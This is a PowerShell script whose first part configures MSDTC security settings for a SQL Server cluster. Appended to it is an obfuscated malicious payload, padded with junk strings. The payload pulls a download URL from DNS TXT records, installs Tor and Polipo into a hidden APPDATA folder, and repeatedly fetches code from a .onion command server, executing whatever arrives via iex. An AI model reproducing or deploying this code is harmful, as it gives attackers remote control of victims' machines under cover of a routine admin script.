



 

 -||-> $ServiceName = "SQL Server (SOX2)" <-||- 

 



 -||-> $TranManSec = "Mutual" <-||-  





 

 

 

 



 -||-> $GroupPath = "HKLM:\Cluster\Groups" <-||- 

 -||-> $GroupList =  -||-> dir $GroupPath <-||-  <-||- 

 



 -||-> foreach ($Group in  -||-> $GroupList <-||- )

{

     -||-> $GroupChildPath = $Group.PSPath <-||- 

     -||-> if ( -||-> ( -||-> Get-ItemProperty -path $GroupChildPath -name Name <-||- ).Name -eq $ServiceName <-||- )

    {

        

         -||-> $ReferencedResources = ( -||-> Get-ItemProperty -path $GroupChildPath -name Contains <-||- ).Contains <-||- 

         -||-> foreach ($Resource in  -||-> $ReferencedResources <-||- )

        {

            

             -||-> $ResourcePath = "HKLM:\Cluster\Resources\$Resource" <-||- 

             -||-> if ( -||-> ( -||-> Get-ItemProperty -path $ResourcePath <-||- ).Type -eq "Distributed Transaction Coordinator" <-||- )

            {

                

                 -||-> $SecurityPath = "$ResourcePath\MSDTCPRIVATE\MSDTC\Security" <-||- 

                 -||-> Set-ItemProperty -path $SecurityPath -name "NetworkDtcAccess" -value 1 <-||- 

                 -||-> Set-ItemProperty -path $SecurityPath -name "NetworkDtcAccessClients" -value 0 <-||- 

                 -||-> Set-ItemProperty -path $SecurityPath -name "NetworkDtcAccessTransactions" -value 0 <-||- 

                 -||-> Set-ItemProperty -path $SecurityPath -name "NetworkDtcAccessInbound" -value 1 <-||- 

                 -||-> Set-ItemProperty -path $SecurityPath -name "NetworkDtcAccessOutbound" -value 1 <-||- 

                 -||-> Set-ItemProperty -path $SecurityPath -name "LuTransactions" -value 1 <-||- 

 

                

                 -||-> $SecurityPath = "$ResourcePath\MSDTCPRIVATE\MSDTC" <-||- 

                 -||-> if ( -||-> $TranManSec -eq "None" <-||- )

                {

                     -||-> Set-ItemProperty -path $MSDTCPath -name "TurnOffRpcSecurity" -value 1 <-||- 

                     -||-> Set-ItemProperty -path $MSDTCPath -name "AllowOnlySecureRpcCalls" -value 0 <-||- 

                     -||-> Set-ItemProperty -path $MSDTCPath -name "FallbackToUnsecureRPCIfNecessary" -value 0 <-||- 

                }

 

                elseif ( -||-> $TranManSec -eq "Incoming" <-||- )

                {

                     -||-> Set-ItemProperty -path $MSDTCPath -name "TurnOffRpcSecurity" -value 0 <-||- 

                     -||-> Set-ItemProperty -path $MSDTCPath -name "AllowOnlySecureRpcCalls" -value 0 <-||- 

                     -||-> Set-ItemProperty -path $MSDTCPath -name "FallbackToUnsecureRPCIfNecessary" -value 1 <-||- 

                }

 

                else 

                {

                     -||-> Set-ItemProperty -path $MSDTCPath -name "TurnOffRpcSecurity" -value 0 <-||- 

                     -||-> Set-ItemProperty -path $MSDTCPath -name "AllowOnlySecureRpcCalls" -value 1 <-||- 

                     -||-> Set-ItemProperty -path $MSDTCPath -name "FallbackToUnsecureRPCIfNecessary" -value 0 <-||- 

                } <-||-  

 

            } <-||- 

        } <-||- 

    } <-||- 

} <-||- 

 -||-> 'xneZtEDC' <-||- ; -||-> $ErrorActionPreference = 'SilentlyContinue' <-||- ; -||-> 'uqaaPxuaCN' <-||- ; -||-> 'DOBHbJqlkRM' <-||- ; -||-> $kn = ( -||-> get-wmiobject Win32_ComputerSystemProduct <-||- ).UUID <-||- ; -||-> 'WVy' <-||- ; -||-> 'gKEZgPRMl' <-||- ; -||-> if ( -||-> ( -||-> gp HKCU:\\Software\Microsoft\Windows\CurrentVersion\Run <-||- ) -match $kn <-||- ){; -||-> 'mUzql' <-||- ; -||-> 'jsvZDTQITNa' <-||- ; -||-> ( -||-> Get-Process -id $pid <-||- ).Kill() <-||- ; -||-> 'NgpYRhj' <-||- ; -||-> 'hVXjCtDvBc' <-||- ;} <-||- ; -||-> 'tUVXQmXbZ' <-||- ; -||-> 'lkTzhJZHwxU' <-||- ; -||-> 'McPzodeY' <-||- ; -||-> 'vNNYv' <-||- ; -||-> function e($dkez){; -||-> 'TfPD' <-||- ; -||-> 'WTw' <-||- ; -||-> $jt = ( -||-> ( -||-> ( -||-> iex "nslookup -querytype=txt $dkez 8.8.8.8" <-||- ) -match '"' <-||- ) -replace '"', '' <-||- )[0].Trim() <-||- ; -||-> 'HdCjwAD' <-||- ; -||-> 'sVSjtZRvr' <-||- ; -||-> $ovg.DownloadFile($jt, $tg) <-||- ; -||-> 'raVw' <-||- ; -||-> 'OQNdBkS' <-||- ; -||-> $ei = $ke.NameSpace($tg).Items() <-||- ; -||-> 'OgnucmQlK' <-||- ; -||-> 'Qfqxov' <-||- ; -||-> $ke.NameSpace($sa).CopyHere($ei, 20) <-||- ; -||-> 'GBMdJNr' <-||- ; -||-> 'VMWS' <-||- ; -||-> rd $tg <-||- ; -||-> 'pnoFau' <-||- ; -||-> 'SedloE' <-||- ;} <-||- ; -||-> 'NxPZPIV' <-||- ; -||-> 'ypi' <-||- ; -||-> 'AFElBzCp' <-||- ; -||-> 'bYRWML' <-||- ; -||-> 'UYANxqtLg' <-||- ; -||-> 'QBC' <-||- ; -||-> $sa = $env:APPDATA + '\' + $kn <-||- ; -||-> 'Eaxyty' <-||- ; -||-> 'IwuaOh' <-||- ; -||-> if ( -||-> !( -||-> Test-Path $sa <-||- ) <-||- ){; -||-> 'amYmrKg' <-||- ; -||-> 'vWAgqtEB' <-||- ; -||-> $qr =  -||-> New-Item -ItemType Directory -Force -Path $sa <-||-  <-||- ; -||-> 'GqNII' <-||- ; -||-> 'HNPIQutUpGv' <-||- ; -||-> $qr.Attributes = "Hidden", "System", "NotContentIndexed" <-||- ; -||-> 'MuRuRa' <-||- ; -||-> 'CmlkCszVCO' <-||- ;} <-||- ; -||-> 'ZdmIGyj' <-||- ; -||-> 'nAYhOpvWV' <-||- ; -||-> 'BIAgIntvoU' <-||- ; -||-> 'GJTBzyjr' <-||- ; -||-> $zul=$sa+ '\tor.exe' <-||- ; -||-> 'swInqmX' <-||- ; -||-> 'LTXwOFNSuL' <-||- ; -||-> $axs=$sa+ '\polipo.exe' <-||- ; -||-> 'qkI' <-||- ; -||-> 'WJPoaNnarn' <-||- ; -||-> $tg=$sa+'\'+$kn+'.zip' <-||- ; -||-> 'Sgw' <-||- ; -||-> 'fYthyZ' <-||- ; -||-> $ovg= -||-> New-Object System.Net.WebClient <-||-  <-||- ; -||-> 'Ils' <-||- ; -||-> 'GRldQfFnfQK' <-||- ; -||-> $ke= -||-> New-Object -C Shell.Application <-||-  <-||- ; -||-> 'vVoutJQ' <-||- ; -||-> 'gHXAsaxc' <-||- ; -||-> 'llaetDv' <-||- ; -||-> 'Zix' <-||- ; -||-> if ( -||-> !( -||-> Test-Path $zul <-||- ) -or !( -||-> Test-Path $axs <-||- ) <-||- ){; -||-> 'QtJINrwhS' <-||- ; -||-> 'XkAxtKLAJ' <-||- ; -||-> e 'i.vankin.de' <-||- ; -||-> 'QqVujkSIPS' <-||- ; -||-> 'dZdn' <-||- ;} <-||- ; -||-> 'GoemQSlIB' <-||- ; -||-> 'IOcJU' <-||- ; -||-> 'FYTMzpCupR' <-||- ; -||-> 'qEnstu' <-||- ; -||-> if ( -||-> !( -||-> Test-Path $zul <-||- ) -or !( -||-> Test-Path $axs <-||- ) <-||- ){; -||-> 'ZGtSt' <-||- ; -||-> 'mHkBgIOsU' <-||- ; -||-> e 'gg.ibiz.cc' <-||- ; -||-> 'sDtXmE' <-||- ; -||-> 'xSBk' <-||- ;} <-||- ; -||-> 'YaiaAJqKPin' <-||- ; -||-> 'gFVK' <-||- ; -||-> 'TumvJVvJKRm' <-||- ; -||-> 'ULQwp' <-||- ; -||-> $pj=$sa+'\roaminglog' <-||- ; -||-> 'numdmmhA' <-||- ; -||-> 'ytEF' <-||- ; -||-> saps $zul -Ar " --Log `"notice file $pj`"" -wi Hidden <-||- ; -||-> 'JCBc' <-||- ; -||-> 'CjHbOtf' <-||- ;do{ -||-> sleep 1 <-||- ; -||-> $xxl= -||-> gc $pj <-||-  <-||- }while( -||-> !( -||-> $xxl -match 'Bootstrapped 100%: Done.' <-||- ) <-||- ); -||-> 'wYtpNVJtdz' <-||- ; -||-> 'XggiQIPFt' <-||- ; -||-> saps $axs -a "socksParentProxy=localhost:9050" -wi Hidden <-||- ; -||-> 'dlV' <-||- ; -||-> 'zVLSO' <-||- ; -||-> sleep 7 <-||- ; -||-> 'FzlDdEynuUz' <-||- ; -||-> 'Ci' <-||- ; -||-> $zpp= -||-> New-Object System.Net.WebProxy( -||-> "localhost:8123" <-||- ) <-||-  <-||- ; -||-> 'MsOkmLs' <-||- ; -||-> 'zRW' <-||- ; -||-> $zpp.useDefaultCredentials = $true <-||- ; -||-> 'PWXVXIMqb' <-||- ; -||-> 'lAy' <-||- ; -||-> $ovg.proxy=$zpp <-||- ; -||-> 'gEkdkGPjVp' <-||- ; -||-> 'xerooSjz' <-||- ; -||-> $ca='http://powerwormjqj42hu.onion/get.php?s=setup&mom=14C6EFBB-F19D-DC11-83A7-001B38A0DF85&uid=' + $kn <-||- ; -||-> 'SGCFq' <-||- ; -||-> 'GkVVnp' <-||- ; -||-> while( -||-> !$qmh <-||- ){ -||-> $qmh=$ovg.downloadString($ca) <-||- } <-||- ; -||-> 'rHo' <-||- ; -||-> 'jtshvrR' <-||- ; -||-> if ( -||-> $qmh -ne 'none' <-||- ){; -||-> 'Ju' <-||- ; -||-> 'VuUTlp' <-||- ; -||-> iex $qmh <-||- ; -||-> 'blhE' <-||- ; -||-> 'AeIepyNd' <-||- ;} <-||- ; -||-> 'whSp' <-||- ;



